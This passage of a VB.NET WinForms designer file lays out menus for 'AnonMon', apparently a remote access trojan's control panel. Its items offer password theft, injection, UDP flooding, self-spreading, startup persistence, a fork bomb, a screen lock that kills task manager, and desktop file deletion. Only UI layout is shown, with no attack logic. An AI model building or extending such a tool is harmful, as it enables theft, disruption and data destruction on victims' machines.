        Me.RightButtonToolStripMenuItem.Size = New System.Drawing.Size(154, 22)
        Me.RightButtonToolStripMenuItem.Text = "Right Button"
        '
        'RightLockToolStripMenuItem
        '
        Me.RightLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.RightLockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.RightLockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
        Me.RightLockToolStripMenuItem.Name = "RightLockToolStripMenuItem"
        Me.RightLockToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.RightLockToolStripMenuItem.Text = "Right Lock"
        '
        'RightUnlockToolStripMenuItem
        '
        Me.RightUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.RightUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.RightUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
        Me.RightUnlockToolStripMenuItem.Name = "RightUnlockToolStripMenuItem"
        Me.RightUnlockToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.RightUnlockToolStripMenuItem.Text = "Right Unlock"
        '
        'MouseMovingToolStripMenuItem
        '
        Me.MouseMovingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MouseMovingToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.MouveLockingToolStripMenuItem, Me.MouveUnlockToolStripMenuItem})
        Me.MouseMovingToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MouseMovingToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_move_32
        Me.MouseMovingToolStripMenuItem.Name = "MouseMovingToolStripMenuItem"
        Me.MouseMovingToolStripMenuItem.Size = New System.Drawing.Size(154, 22)
        Me.MouseMovingToolStripMenuItem.Text = "Mouse Moving"
        '
        'MouveLockingToolStripMenuItem
        '
        Me.MouveLockingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MouveLockingToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MouveLockingToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
        Me.MouveLockingToolStripMenuItem.Name = "MouveLockingToolStripMenuItem"
        Me.MouveLockingToolStripMenuItem.Size = New System.Drawing.Size(151, 22)
        Me.MouveLockingToolStripMenuItem.Text = "Mouve Lock"
        '
        'MouveUnlockToolStripMenuItem
        '
        Me.MouveUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MouveUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MouveUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
        Me.MouveUnlockToolStripMenuItem.Name = "MouveUnlockToolStripMenuItem"
        Me.MouveUnlockToolStripMenuItem.Size = New System.Drawing.Size(151, 22)
        Me.MouveUnlockToolStripMenuItem.Text = "Mouve Unlock"
        '
        'AllToolStripMenuItem
        '
        Me.AllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.AllToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.AllLockToolStripMenuItem, Me.AllUnlockToolStripMenuItem})
        Me.AllToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.AllToolStripMenuItem.Name = "AllToolStripMenuItem"
        Me.AllToolStripMenuItem.Size = New System.Drawing.Size(154, 22)
        Me.AllToolStripMenuItem.Text = "All"
        '
        'AllLockToolStripMenuItem
        '
        Me.AllLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.AllLockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.AllLockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
        Me.AllLockToolStripMenuItem.Name = "AllLockToolStripMenuItem"
        Me.AllLockToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.AllLockToolStripMenuItem.Text = "All Lock"
        '
        'AllUnlockToolStripMenuItem
        '
        Me.AllUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.AllUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.AllUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
        Me.AllUnlockToolStripMenuItem.Name = "AllUnlockToolStripMenuItem"
        Me.AllUnlockToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.AllUnlockToolStripMenuItem.Text = "All Unlock"
        '
        'KeyboardToolStripMenuItem
        '
        Me.KeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.KeyboardToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LockKeyboardToolStripMenuItem, Me.UnlockKeyboardToolStripMenuItem})
        Me.KeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.KeyboardToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.hardware
        Me.KeyboardToolStripMenuItem.Name = "KeyboardToolStripMenuItem"
        Me.KeyboardToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.KeyboardToolStripMenuItem.Text = "Keyboard"
        '
        'LockKeyboardToolStripMenuItem
        '
        Me.LockKeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.LockKeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.LockKeyboardToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
        Me.LockKeyboardToolStripMenuItem.Name = "LockKeyboardToolStripMenuItem"
        Me.LockKeyboardToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.LockKeyboardToolStripMenuItem.Text = "Lock Keyboard"
        '
        'UnlockKeyboardToolStripMenuItem
        '
        Me.UnlockKeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.UnlockKeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.UnlockKeyboardToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
        Me.UnlockKeyboardToolStripMenuItem.Name = "UnlockKeyboardToolStripMenuItem"
        Me.UnlockKeyboardToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.UnlockKeyboardToolStripMenuItem.Text = "Unlock Keyboard"
        '
        'IconsToolStripMenuItem
        '
        Me.IconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.IconsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ShowIconsToolStripMenuItem, Me.HideIconsToolStripMenuItem})
        Me.IconsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.IconsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_browse_padddge_32
        Me.IconsToolStripMenuItem.Name = "IconsToolStripMenuItem"
        Me.IconsToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.IconsToolStripMenuItem.Text = "Icons"
        '
        'ShowIconsToolStripMenuItem
        '
        Me.ShowIconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ShowIconsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ShowIconsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye2
        Me.ShowIconsToolStripMenuItem.Name = "ShowIconsToolStripMenuItem"
        Me.ShowIconsToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.ShowIconsToolStripMenuItem.Text = "Show Icons"
        '
        'HideIconsToolStripMenuItem
        '
        Me.HideIconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.HideIconsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.HideIconsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_hide2
        Me.HideIconsToolStripMenuItem.Name = "HideIconsToolStripMenuItem"
        Me.HideIconsToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.HideIconsToolStripMenuItem.Text = "Hide Icons"
        '
        'StartIconToolStripMenuItem
        '
        Me.StartIconToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.StartIconToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartIconHideToolStripMenuItem1, Me.ShowStartIconToolStripMenuItem})
        Me.StartIconToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.StartIconToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_winqsddows8_32
        Me.StartIconToolStripMenuItem.Name = "StartIconToolStripMenuItem"
        Me.StartIconToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.StartIconToolStripMenuItem.Text = "Start Icon"
        '
        'StartIconHideToolStripMenuItem1
        '
        Me.StartIconHideToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.StartIconHideToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.StartIconHideToolStripMenuItem1.Image = Global.AnonMon.My.Resources.Resources.icons8_hide2
        Me.StartIconHideToolStripMenuItem1.Name = "StartIconHideToolStripMenuItem1"
        Me.StartIconHideToolStripMenuItem1.Size = New System.Drawing.Size(129, 22)
        Me.StartIconHideToolStripMenuItem1.Text = "Hide Icon"
        '
        'ShowStartIconToolStripMenuItem
        '
        Me.ShowStartIconToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ShowStartIconToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ShowStartIconToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye1
        Me.ShowStartIconToolStripMenuItem.Name = "ShowStartIconToolStripMenuItem"
        Me.ShowStartIconToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.ShowStartIconToolStripMenuItem.Text = "Show Icon"
        '
        'GetPasswordsToolStripMenuItem
        '
        Me.GetPasswordsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.GetPasswordsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.GetPasswordsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_key
        Me.GetPasswordsToolStripMenuItem.Name = "GetPasswordsToolStripMenuItem"
        Me.GetPasswordsToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
        Me.GetPasswordsToolStripMenuItem.Text = "Get Passwords"
        '
        'InjectionToolStripMenuItem
        '
        Me.InjectionToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.InjectionToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.InjectionToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_Syringe_with_a_drop_of_bazlood_32
        Me.InjectionToolStripMenuItem.Name = "InjectionToolStripMenuItem"
        Me.InjectionToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
        Me.InjectionToolStripMenuItem.Text = "Injection"
        '
        'MiscToolStripMenuItem
        '
        Me.MiscToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MiscToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.MessageToolStripMenuItem, Me.PowerToolStripMenuItem, Me.BSODToolStripMenuItem, Me.DDOSToolStripMenuItem, Me.OSInformationToolStripMenuItem, Me.SpreadToolStripMenuItem, Me.AddToStarUpToolStripMenuItem, Me.VirusToolStripMenuItem, Me.MonitorScreenToolStripMenuItem})
        Me.MiscToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MiscToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_settinpmgs
        Me.MiscToolStripMenuItem.Name = "MiscToolStripMenuItem"
        Me.MiscToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
        Me.MiscToolStripMenuItem.Text = "Miscellaneous"
        '
        'MessageToolStripMenuItem
        '
        Me.MessageToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MessageToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MessageToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.ichcons8_speech_bubble___Copie
        Me.MessageToolStripMenuItem.Name = "MessageToolStripMenuItem"
        Me.MessageToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.MessageToolStripMenuItem.Text = "Message"
        '
        'PowerToolStripMenuItem
        '
        Me.PowerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.PowerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LogOutToolStripMenuItem, Me.RestartToolStripMenuItem, Me.ShutDownToolStripMenuItem, Me.HibernateToolStripMenuItem, Me.SuspendToolStripMenuItem})
        Me.PowerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.PowerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_lightning_boltsds
        Me.PowerToolStripMenuItem.Name = "PowerToolStripMenuItem"
        Me.PowerToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.PowerToolStripMenuItem.Text = "Computer Power"
        '
        'LogOutToolStripMenuItem
        '
        Me.LogOutToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.LogOutToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.LogOutToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_logout_rounded_left
        Me.LogOutToolStripMenuItem.Name = "LogOutToolStripMenuItem"
        Me.LogOutToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.LogOutToolStripMenuItem.Text = "Log Out"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.RestartToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.RestartToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8sds_restart
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.RestartToolStripMenuItem.Text = "Reboot"
        '
        'ShutDownToolStripMenuItem
        '
        Me.ShutDownToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ShutDownToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ShutDownToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_shutdown_64
        Me.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem"
        Me.ShutDownToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.ShutDownToolStripMenuItem.Text = "ShutDown"
        '
        'HibernateToolStripMenuItem
        '
        Me.HibernateToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.HibernateToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.HibernateToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_hibernssate_32
        Me.HibernateToolStripMenuItem.Name = "HibernateToolStripMenuItem"
        Me.HibernateToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.HibernateToolStripMenuItem.Text = "Hibernate"
        '
        'SuspendToolStripMenuItem
        '
        Me.SuspendToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.SuspendToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.SuspendToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_sleesdp_32
        Me.SuspendToolStripMenuItem.Name = "SuspendToolStripMenuItem"
        Me.SuspendToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.SuspendToolStripMenuItem.Text = "Suspend"
        '
        'BSODToolStripMenuItem
        '
        Me.BSODToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.BSODToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.BSODToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_poisqsdqsdon
        Me.BSODToolStripMenuItem.Name = "BSODToolStripMenuItem"
        Me.BSODToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.BSODToolStripMenuItem.Text = "BSOD"
        '
        'DDOSToolStripMenuItem
        '
        Me.DDOSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.DDOSToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UDPToolStripMenuItem})
        Me.DDOSToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.DDOSToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_wi_qsdqs69fi
        Me.DDOSToolStripMenuItem.Name = "DDOSToolStripMenuItem"
        Me.DDOSToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.DDOSToolStripMenuItem.Text = "DDOS"
        '
        'UDPToolStripMenuItem
        '
        Me.UDPToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.UDPToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.UDPToolStripMenuItem.Name = "UDPToolStripMenuItem"
        Me.UDPToolStripMenuItem.Size = New System.Drawing.Size(97, 22)
        Me.UDPToolStripMenuItem.Text = "UDP"
        '
        'OSInformationToolStripMenuItem
        '
        Me.OSInformationToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.OSInformationToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.OSInformationToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_info_zedzepopup
        Me.OSInformationToolStripMenuItem.Name = "OSInformationToolStripMenuItem"
        Me.OSInformationToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.OSInformationToolStripMenuItem.Text = "OS Information"
        '
        'SpreadToolStripMenuItem
        '
        Me.SpreadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.SpreadToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.SpreadToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_c_drive_2_32
        Me.SpreadToolStripMenuItem.Name = "SpreadToolStripMenuItem"
        Me.SpreadToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.SpreadToolStripMenuItem.Text = "Spread"
        Me.SpreadToolStripMenuItem.ToolTipText = "Spread server on all devices found (option in builder)"
        '
        'AddToStarUpToolStripMenuItem
        '
        Me.AddToStarUpToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.AddToStarUpToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.AddToStarUpToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_external_link
        Me.AddToStarUpToolStripMenuItem.Name = "AddToStarUpToolStripMenuItem"
        Me.AddToStarUpToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.AddToStarUpToolStripMenuItem.Text = "Add To StarUp"
        Me.AddToStarUpToolStripMenuItem.ToolTipText = "Add the server to startup (option in builder)"
        '
        'VirusToolStripMenuItem
        '
        Me.VirusToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.VirusToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RedScreenToolStripMenuItem, Me.ForkBombToolStripMenuItem, Me.DeleteAllFilesOnDesktopToolStripMenuItem})
        Me.VirusToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.VirusToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_biohasqdzard_32
        Me.VirusToolStripMenuItem.Name = "VirusToolStripMenuItem"
        Me.VirusToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.VirusToolStripMenuItem.Text = "Virus"
        '
        'RedScreenToolStripMenuItem
        '
        Me.RedScreenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.RedScreenToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.RedScreenToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_blue_screen_of_deatggh_32RD
        Me.RedScreenToolStripMenuItem.Name = "RedScreenToolStripMenuItem"
        Me.RedScreenToolStripMenuItem.Size = New System.Drawing.Size(162, 22)
        Me.RedScreenToolStripMenuItem.Text = "Red Screen"
        Me.RedScreenToolStripMenuItem.ToolTipText = "Block Keyboard , Block Mouse , add a watchdog to kill task manager and set a full" &
    " red screen window " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "To Close , you need to reboot "
        '
        'ForkBombToolStripMenuItem
        '
        Me.ForkBombToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ForkBombToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ForkBombToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_expqslosion_32
        Me.ForkBombToolStripMenuItem.Name = "ForkBombToolStripMenuItem"
        Me.ForkBombToolStripMenuItem.Size = New System.Drawing.Size(162, 22)
        Me.ForkBombToolStripMenuItem.Text = "Fork Bomb"
        '
        'DeleteAllFilesOnDesktopToolStripMenuItem
        '
        Me.DeleteAllFilesOnDesktopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.DeleteAllFilesOnDesktopToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DeleteFilesToolStripMenuItem, Me.DeleteFilesRebootToolStripMenuItem})
        Me.DeleteAllFilesOnDesktopToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_deskddtop_32
        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Name = "DeleteAllFilesOnDesktopToolStripMenuItem"
        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Size = New System.Drawing.Size(162, 22)
        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Text = "Files On Desktop"
        '
        'DeleteFilesToolStripMenuItem
        '
        Me.DeleteFilesToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.DeleteFilesToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.DeleteFilesToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_delete_biqsdqsn_32
